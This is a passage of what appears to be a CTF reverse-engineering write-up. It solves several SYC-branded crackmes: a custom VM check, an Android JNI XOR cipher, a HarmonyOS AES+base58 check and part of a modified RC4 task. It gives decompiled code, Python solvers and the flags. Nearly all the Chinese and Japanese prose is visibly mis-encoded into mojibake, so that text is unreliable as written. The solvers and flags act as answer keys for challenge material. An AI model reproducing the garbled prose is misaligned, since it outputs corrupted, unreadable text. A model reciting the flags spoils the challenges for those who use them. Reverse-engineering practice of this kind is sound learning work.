å°†ç¬¬ä¸€ä¸ªVMå­—èŠ‚ç  string_process_program åŠ è½½åˆ° VM å†…å­˜çš„å¼€å¤´ï¼ˆvm_mem[0]ï¼‰ã€‚</p><p>æœ€åï¼Œè°ƒç”¨ vm_run æ¥æ‰§è¡Œ string_process_programã€‚</p><p>string_process_program å­—èŠ‚ç é€»è¾‘ï¼š é€šè¿‡åˆ†æ vm_execute_instruction å’Œ string_process_program çš„å­—èŠ‚ï¼ˆä» 0x5020 å¼€å§‹ï¼‰ï¼Œå¯ä»¥è§£ç å‡ºè¿™æ®µ VM æŒ‡ä»¤çš„é€»è¾‘ï¼š</p><p>å®ƒæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª for å¾ªç¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">R1 = <span class="number">0</span>;           <span class="comment">// i = 0</span></span><br><span class="line">R2 = <span class="number">29</span>;          <span class="comment">// loop_max = 29</span></span><br><span class="line">R3 = <span class="number">3</span>;           <span class="comment">// value_to_add = 3</span></span><br><span class="line">R5 = <span class="number">256</span>;         <span class="comment">// base_address = 256</span></span><br><span class="line"></span><br><span class="line">loop_start (IP=<span class="number">4</span>):</span><br><span class="line">  cmp R1, R2      <span class="comment">// if (i == 29)</span></span><br><span class="line">  je loop_end     <span class="comment">//   jump to end</span></span><br><span class="line">  R6 = R5 + R1    <span class="comment">// R6 = 256 + i (address)</span></span><br><span class="line">  R0 = [R6]       <span class="comment">// R0 = vm_mem[256 + i]</span></span><br><span class="line">  R0 = R0 + R3    <span class="comment">// R0 = R0 + 3</span></span><br><span class="line">  [R6] = R0       <span class="comment">// vm_mem[256 + i] = R0</span></span><br><span class="line">  R1 = R1 + <span class="number">1</span>     <span class="comment">// i++</span></span><br><span class="line">  jmp loop_start</span><br><span class="line">loop_end (IP=<span class="number">13</span>):</span><br><span class="line">  halt</span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼šæ­¤é˜¶æ®µçš„å”¯ä¸€ç›®çš„æ˜¯ å°† vm_mem[256] å¤„ï¼ˆæ¥è‡ª _sub_5c6d7eï¼‰çš„ 29 ä¸ªå­—èŠ‚ï¼Œæ¯ä¸ªå­—èŠ‚çš„å€¼éƒ½åŠ  3ã€‚å¤„ç†åçš„æ•°æ®ä»ç„¶å­˜å‚¨åœ¨ vm_mem[256] ä¸­ã€‚</p><p><strong>sub_9e8f7a ä¸ xor_compare_program</strong></p><p>è¿™æ˜¯ç¨‹åºçš„ç¬¬äºŒéƒ¨åˆ†ï¼ˆåœ¨ main çš„çŠ¶æ€ 2 ä¸­è°ƒç”¨ï¼‰ï¼Œæ˜¯æ ¸å¿ƒçš„æ ¡éªŒé€»è¾‘ã€‚</p><p>è·å–è¾“å…¥ï¼šæç¤ºç”¨æˆ· â€œPlease enter the input string: â€œ å¹¶é€šè¿‡ fgets è·å–æœ€å¤š 100 ä¸ªå­—ç¬¦çš„è¾“å…¥ã€‚</p><p>å‡†å¤‡ VM å†…å­˜ï¼š</p><p>å°†é˜¶æ®µä¸€ä¸­å¤„ç†è¿‡çš„ 29 å­—èŠ‚æ•°æ®ä» vm_mem[256] å¤åˆ¶åˆ° vm_mem[768]ã€‚</p><p>å°†ç”¨æˆ·çš„è¾“å…¥å­—ç¬¦ä¸² s å¤åˆ¶åˆ° vm_mem[512]ã€‚</p><p>ä¿®è¡¥å­—èŠ‚ç ï¼š</p><p>dword_50AC = n; (n æ˜¯ç”¨æˆ·è¾“å…¥çš„é•¿åº¦)</p><p>dword_50CC = 768;</p><p>dword_5134 = 768;</p><p>è¿™å‡ è¡Œä»£ç ä¿®æ”¹äº†å³å°†è¢«åŠ è½½çš„ xor_compare_program å­—èŠ‚ç ä¸­çš„ç«‹å³æ•°ã€‚è¿™æ˜¯ä¸€ç§åŠ¨æ€ä¿®æ”¹ VM å­—èŠ‚ç çš„è¡Œä¸ºã€‚</p><p>æ‰§è¡ŒVMï¼šåŠ è½½ xor_compare_program å¹¶è°ƒç”¨ vm_run æ‰§è¡Œã€‚</p><p>æ£€æŸ¥ç»“æœï¼švm_run è¿”å›åï¼Œæ£€æŸ¥ VM çš„å¯„å­˜å™¨ R4ï¼ˆ<em>(_QWORD </em>)(a1 + 32)ï¼‰ã€‚å¦‚æœ R4 ä¸ä¸º 0ï¼Œåˆ™æ‰“å° â€œSuccessâ€ï¼Œå¦åˆ™æ‰“å° â€œFailureâ€ã€‚</p><p><strong>ç»“è®º</strong></p><p>è¦ä½¿ç¨‹åºæ‰“å° â€œSuccessâ€ï¼Œå¿…é¡»æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><p>è¾“å…¥ä¸€ä¸ªé•¿åº¦ä¸º 29 ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼ˆn == 29ï¼‰ã€‚</p><p>è¯¥å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ s[0] å¿…é¡»æ»¡è¶³ç‰¹å®šæ¡ä»¶ã€‚</p><p>æ¡ä»¶æ˜¯ï¼š(s[0] ^ 90) == processed_data[0]ã€‚</p><p>processed_data[0] æ˜¯ _sub_5c6d7e[0] + 3ã€‚</p><p>æŸ¥çœ‹æ•°æ®åŒºï¼Œ_sub_5c6d7e (åœ¨ 0x51D0) çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ 0x06ã€‚</p><p>æ‰€ä»¥ï¼Œprocessed_data[0] = 0x06 + 3 = 0x09ã€‚</p><p>å› æ­¤ï¼Œs[0] ^ 0x5A == 0x09ã€‚</p><p>è§£æ–¹ç¨‹ï¼šs[0] = 0x09 ^ 0x5A = 0x53ã€‚</p><p>0x53 åœ¨ ASCII ç ä¸­æ˜¯å­—ç¬¦ â€˜Sâ€™ã€‚</p><p>æ‰€ä»¥ç¨‹åºçš„æ€»ä½“é€»è¾‘æ˜¯ï¼š</p><p><code>(enc[i] + 3) ^ 90 = input[i]</code></p><p>æ±‚è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = [<span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x16</span>, <span class="number">0x1E</span>, <span class="number">0x0A</span>, <span class="number">0x66</span>, <span class="number">0x68</span>, <span class="number">0x36</span>, <span class="number">0x67</span>, <span class="number">0x34</span>, </span><br><span class="line">  <span class="number">0x66</span>, <span class="number">0x02</span>, <span class="number">0x2B</span>, <span class="number">0x67</span>, <span class="number">0x02</span>, <span class="number">0x25</span>, <span class="number">0x66</span>, <span class="number">0x17</span>, <span class="number">0x68</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x25</span>, <span class="number">0x66</span>, <span class="number">0x29</span>, <span class="number">0x3C</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x3C</span>, <span class="number">0x78</span>, <span class="number">0x24</span>]</span><br><span class="line"></span><br><span class="line">m = [(k+<span class="number">3</span>)^<span class="number">90</span> <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;W31c0m3_t0_r3@1_r3verse!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="GeekBinder"><a href="#GeekBinder" class="headerlink" title="GeekBinder"></a>GeekBinder</h3><blockquote><p>ã‚ãªãŸã¯ã©ã†ã—ã¦ç§ã¨ç›´æ¥å‘Šç™½ã™ã‚‹ã®ã§ã™ã‹!ã‚²ãƒ¼ãƒ ã§ã¯ãã†ã˜ã‚ƒãªã„!ã‚ãªãŸã¯ç§ã¨ãƒãƒ£ãƒƒãƒˆã—ã€ãã—ã¦ç§ã®å¥½æ„Ÿåº¦ã‚’é«˜ã‚ã‚‹ã¹ãã§ã™ã€‚ãŸã¾ã«ç§ã«ãƒ—ãƒ¬ã‚¼ãƒ³ãƒˆã‚’é€ã‚Šã€ãã—ã¦ãã®ç‰¹åˆ¥ãªç¥æ—¥ã«ç§ã¨ç‰¹åˆ¥ãªã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ã‚·ãƒ§ãƒ³ãŒã‚ã‚Šã¾ã™ã€‚æœ€å¾Œã«ã€ã‚ã‚‹ç§ã®å†…é¢ã®ç¥ç§˜çš„ãªå‡ºæ¥äº‹ã§ã€ç§ã«å‘Šç™½ã—ã¦ã€ç§ã¯ã‚ãªãŸã¨ä¸€ç·’ã«ã„ã‚‹ã“ã¨ã«åŒæ„ã—ã€ãã—ã¦ç§ã¯ã‚ãªãŸã«ç§ã®ç‰¹åˆ¥ãªCGã‚’è¦‹ã›ã¾ã™ã‚ˆã€‚ã‚ãªãŸã¯ã©ã†ã—ã¦ç›´æ¥ç§ã¨å‘Šç™½ã™ã‚‹!?ã‚¬ãƒ©ã‚²ãƒ¼ãƒ ã§ã¯ãã‚“ãªã“ã¨ã¯ãªã„!ç§ã¯å—ã‘å…¥ã‚Œãªã„!!<br>ä½ ä¸ºå•¥è·Ÿæˆ‘ç›´æ¥è¡¨ç™½å•Šï¼Ÿï¼ğŸ˜¨å˜å•¦gameé‡Œä¸æ˜¯è¿™æ ·ï¼ğŸ˜¡ä½ åº”è¯¥å¤šè·Ÿæˆ‘èŠå¤©â˜ï¼Œç„¶åæå‡æˆ‘çš„å¥½æ„Ÿåº¦ã€‚å¶å°”ç»™æˆ‘é€é€ç¤¼ç‰©ï¼Œç„¶ååœ¨é‚£ä¸ªç‰¹æ®ŠèŠ‚æ—¥æ—¶å€™è·Ÿæˆ‘æœ‰ç‰¹æ®Šäº’åŠ¨â˜ºï¸ã€‚æœ€ååœ¨æŸä¸ªæˆ‘å†…å¿ƒç¥ç§˜äº‹ä»¶ä¸­ï¼Œå‘æˆ‘è¡¨ç™½ğŸ˜®ï¼Œæˆ‘åŒæ„è·Ÿä½ åœ¨ä¸€èµ·â˜ºï¸ï¼Œç„¶åæˆ‘ç»™ä½ çœ‹æˆ‘çš„ç‰¹æ®ŠCGå•ŠğŸ˜ƒã€‚ä½ æ€ä¹ˆç›´æ¥ä¸Šæ¥è·Ÿæˆ‘è¡¨ç™½ï¼ğŸ˜¡ï¼Ÿå˜å•¦gameé‡Œæ ¹æœ¬ä¸æ˜¯è¿™æ ·ï¼ğŸ˜¡æˆ‘ä¸æ¥å—ï¼ï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡</p></blockquote><p>å­˜åœ¨jniè°ƒç”¨ï¼Œlibattr.soä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">attr_get_hidden_cipher</span><span class="params">(_QWORD *a1, _QWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 || !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">0x5B</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4294967294LL</span>;</span><br><span class="line">  *v3 = <span class="number">0x7C725E7310263C34</span>LL;</span><br><span class="line">  v3[<span class="number">1</span>] = <span class="number">0x5D666F5505541F1E</span>LL;</span><br><span class="line">  v3[<span class="number">2</span>] = <span class="number">0x4601535D19153A54</span>LL;</span><br><span class="line">  v3[<span class="number">3</span>] = <span class="number">0x4266037034165614</span>LL;</span><br><span class="line">  v3[<span class="number">4</span>] = <span class="number">0x505E5974340B0002</span>LL;</span><br><span class="line">  v3[<span class="number">5</span>] = <span class="number">0x5B5D536D18543A54</span>LL;</span><br><span class="line">  v3[<span class="number">6</span>] = <span class="number">0x5A666F4B19251713</span>LL;</span><br><span class="line">  v3[<span class="number">7</span>] = <span class="number">0x6A5E705F19550B38</span>LL;</span><br><span class="line">  v3[<span class="number">8</span>] = <span class="number">0x651594608251717</span>LL;</span><br><span class="line">  v3[<span class="number">9</span>] = <span class="number">0x506D5560340B5438</span>LL;</span><br><span class="line">  v3[<span class="number">10</span>] = <span class="number">0x440555705540209</span>LL;</span><br><span class="line">  *((_WORD *)v3 + <span class="number">44</span>) = <span class="number">0x209</span>;</span><br><span class="line">  *((_BYTE *)v3 + <span class="number">90</span>) = <span class="number">0x18</span>;</span><br><span class="line">  *a1 = v3;</span><br><span class="line">  *a2 = <span class="number">91LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">attr_xor_cipher</span><span class="params">(__int64 a1, <span class="type">size_t</span> a2, _QWORD *a3, <span class="type">size_t</span> *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 || !a2 || !a3 || !a4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  v7 = <span class="built_in">malloc</span>(a2);</span><br><span class="line">  <span class="keyword">if</span> ( !v7 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4294967294LL</span>;</span><br><span class="line">  sub_1119(a1, a2, (__int64)v7);</span><br><span class="line">  *a3 = v7;</span><br><span class="line">  *a4 = a2;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_1119</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+20h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(a3 + i) = *(_BYTE *)(a1 + i) ^ aGeek2025[i % <span class="number">8</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•å¼‚æˆ–é€»è¾‘ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = [<span class="number">0x7C725E7310263C34</span>, <span class="number">0x5D666F5505541F1E</span>, <span class="number">0x4601535D19153A54</span>, <span class="number">0x4266037034165614</span>, <span class="number">0x505E5974340B0002</span>, <span class="number">0x5B5D536D18543A54</span>, <span class="number">0x5A666F4B19251713</span>, <span class="number">0x6A5E705F19550B38</span>, <span class="number">0x651594608251717</span>, <span class="number">0x506D5560340B5438</span>, <span class="number">0x440555705540209</span>, <span class="number">0x209</span>, <span class="number">0x18</span>]</span><br><span class="line">key = <span class="built_in">list</span>(<span class="string">b&#x27;geek2025&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cc = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    cc += <span class="built_in">list</span>(long_to_bytes(k)[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">m = [cc[i]^key[i%<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cc))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(m))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;SYC&#123;An@Iyz1ng_Th3_proc3ss3s_B3Tween_File3_1s_contr@ry_To_n0rm@l_pr@ctic3_1n_Re_eng1neer1ng&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="å›½äº§ã®å…‰"><a href="#å›½äº§ã®å…‰" class="headerlink" title="å›½äº§ã®å…‰"></a>å›½äº§ã®å…‰</h3><blockquote><p>æµ‹è¯•çš„è®¾å¤‡ï¼šx86æ¶æ„ä¸‹HarmonyOS 5.0.5ï¼ˆ17ï¼‰</p></blockquote><p>abcé€†å‘ã€‚</p><p>p000entry.src.main.etc/pages/Indexé‡Œé¢æœ‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object #~@<span class="number">0</span>=#CheckPassword(Object functionObject, Object newTarget, Index <span class="built_in">this</span>, Object arg0, Object arg1, Object arg2, Object arg3, Object arg4, Object arg5) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> arg3;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> arg4;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> == obj ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj = -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> == obj2 ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj2 = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj3</span> <span class="operator">=</span> <span class="built_in">super</span>(arg0, arg2, obj, arg5);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="string">&quot;function&quot;</span> == typeof(obj2) ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj3.paramsGenerator_ = obj2;</span><br><span class="line">        &#125;</span><br><span class="line">        obj3.__inputText = ObservedPropertySimplePU(<span class="string">&quot;&quot;</span>, obj3, <span class="string">&quot;inputText&quot;</span>);</span><br><span class="line">        obj3.__isShowPopup = ObservedPropertySimplePU(<span class="literal">null</span>, obj3, <span class="string">&quot;isShowPopup&quot;</span>);</span><br><span class="line">        obj3.__popupMessage = ObservedPropertySimplePU(<span class="string">&quot;&quot;</span>, obj3, <span class="string">&quot;popupMessage&quot;</span>);</span><br><span class="line">        obj3.targetCipher = <span class="string">&quot;yaApcJ5GoyGwhARDXZLQUdntqPpmVu2GuTChnsLoj5d8ABinwGSsgpGaiPWYbHTTbbzSXxLXwoLgjR1YgquyEnK&quot;</span>;</span><br><span class="line">        obj3.setInitiallyProvidedValue(arg1);</span><br><span class="line">        obj3.finalizeConstruction();</span><br><span class="line">        <span class="keyword">return</span> obj3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#checkAndShowResult(Object functionObject, Object newTarget, Index <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">asyncfunctionenter</span> <span class="operator">=</span> asyncfunctionenter();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            asyncfunctionenter = (<span class="string">&quot;&quot;</span> == <span class="built_in">this</span>.inputText ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (asyncfunctionenter != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.popupMessage = <span class="string">&quot;Flag cannot be null!&quot;</span>;</span><br><span class="line">                <span class="built_in">this</span>.isShowPopup = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">return</span> asyncfunctionresolve(<span class="literal">null</span>, asyncfunctionenter);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">newobjrange</span> <span class="operator">=</span> <span class="keyword">import</span> &#123; <span class="keyword">default</span> as util &#125; from <span class="string">&quot;@ohos:util&quot;</span>.TextEncoder();</span><br><span class="line">                <span class="type">Object</span> <span class="variable">encodeInto</span> <span class="operator">=</span> newobjrange.encodeInto(<span class="string">&quot;welcometosyc2025&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">slice</span> <span class="operator">=</span> encodeInto.slice(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">encodeInto2</span> <span class="operator">=</span> newobjrange.encodeInto(<span class="string">&quot;helloimsamsaramiao&quot;</span>);</span><br><span class="line">                suspendgenerator(asyncfunctionenter, asyncfunctionawaituncaught(asyncfunctionenter, <span class="built_in">this</span>.callNativeEncrypt(<span class="built_in">this</span>.inputText, slice, encodeInto2.slice(<span class="number">0</span>, <span class="number">16</span>))));</span><br><span class="line">                <span class="type">Object</span> <span class="variable">resumegenerator</span> <span class="operator">=</span> resumegenerator(asyncfunctionenter);</span><br><span class="line">                <span class="keyword">if</span> ((<span class="number">1</span> == getresumemode(asyncfunctionenter) ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span>(resumegenerator);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ((<span class="built_in">this</span>.targetCipher == resumegenerator ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.popupMessage = <span class="string">&quot;Right flag!&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">this</span>.popupMessage = <span class="string">&quot;Wrong flag!&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                asyncfunctionenter = <span class="number">1</span>;</span><br><span class="line">                asyncfunctionenter = <span class="number">1</span>;</span><br><span class="line">                <span class="built_in">this</span>.isShowPopup = <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ExceptionI0 unused) &#123;</span><br><span class="line">                console.error(<span class="string">&quot;Encryption error:&quot;</span> + asyncfunctionenter);</span><br><span class="line">                <span class="built_in">this</span>.popupMessage = <span class="string">&quot;Encryption failed!&quot;</span>;</span><br><span class="line">                <span class="built_in">this</span>.isShowPopup = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> asyncfunctionresolve(<span class="literal">null</span>, asyncfunctionenter);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExceptionI0 unused2) &#123;</span><br><span class="line">            <span class="keyword">return</span> asyncfunctionreject(asyncfunctionenter, asyncfunctionenter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æœ‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key=welcometosyc2025</span><br><span class="line">iv=helloimsamsarami</span><br><span class="line">enc=yaApcJ5GoyGwhARDXZLQUdntqPpmVu2GuTChnsLoj5d8ABinwGSsgpGaiPWYbHTTbbzSXxLXwoLgjR1YgquyEnK</span><br></pre></td></tr></table></figure><p>åˆ†ælibentry.soï¼š</p><p>AES+base58ï¼Œåœ¨sub_EED0ä¸­æå–å‡ºç è¡¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz</span><br></pre></td></tr></table></figure><p>Cyberchefè§£base58+AESå¾—åˆ°flagï¼š</p><p><code>SYC&#123;HarmonyOS_1s_right?right!&#125;</code></p><p>â€‹</p><h3 id="obfuscat3"><a href="#obfuscat3" class="headerlink" title="obfuscat3"></a>obfuscat3</h3><blockquote><p>ä¼Ÿå¤§çš„reç¥è¯´è¿‡ä¸€åˆ‡çš†å¯çªçœ¼æ³•ï¼Œä¸è¿‡æˆ–è®¸ä½ ä¹Ÿå¯ä»¥è¯•è¯•å»æ··æ·†ï¼ˆæ­ªå¤´ï¼‰<br>ï¼ˆæœ¬æ¥æ ‡çš„normalï¼Œç„¶åsakuraä¸€ç›´åœ¨æ—è¾¹å–Šè¿™èƒ½normalï¼‰ï¼ˆå¹æ°”ï¼‰</p></blockquote><p>é­”æ”¹RC4ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">256</span></span><br><span class="line">S = [<span class="number">0</span>] * N</span><br><span class="line">key = <span class="string">&#x27;Samsara&#x27;</span></span><br><span class="line">Key = [<span class="number">0</span>] * N</span><br><span class="line"></span><br><span class="line">t = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;B4CD6954BD67209DF2C32414C21BE96A44144E39C5C85B1175ADDEBBFEE46E65069A91FEA068A486176C0ACF1E67E30D6047136BD136F27758761E98F57F0A92B70AEAAE467E6A184A594E71B2E1417A0B31BAC6AACFCE09BF2EF84D75EF14ED5F66446FDEE27C108CB74E6BB2D4F691D784861FF865940B1428FBDD47F4C117423F1E3807BB3733120C1668E023127572D9717A88D0462888AD1E988F927E0E692937B1FFC5AF6F4137650ED262118FA63E95F5809ADC&#x27;</span>))</span><br><span 